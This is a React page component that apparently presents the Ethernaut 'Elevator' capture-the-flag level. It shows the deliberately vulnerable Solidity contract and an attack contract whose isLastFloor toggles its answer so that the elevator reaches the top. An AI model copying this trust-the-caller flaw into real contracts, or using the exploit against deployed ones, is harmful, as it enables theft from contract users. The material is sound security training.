import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Elevator = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  interface Building {
    function isLastFloor(uint) external returns (bool);
  }
  
  
  contract Elevator {
    bool public top;
    uint public floor;
  
    function goTo(uint _floor) public {
      Building building = Building(msg.sender);
  
      if (! building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
      }
    }
  }`;

  const solutionCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    address public elevatorAddress;
    bool public last = true;

    constructor(address _elevatorAddress) {
        elevatorAddress = _elevatorAddress;
    }

    function isLastFloor(uint256 _number) external returns (bool) {
        last = !last;
        return last;
    }

    function attack() external {
        IElevator(elevatorAddress).goTo(100);
    }
}

`;

  return (
    <div>
      <h1 className="headerText">Hello Ethernaut</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="For start this project we just need to open console and write commans below."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Elevator;
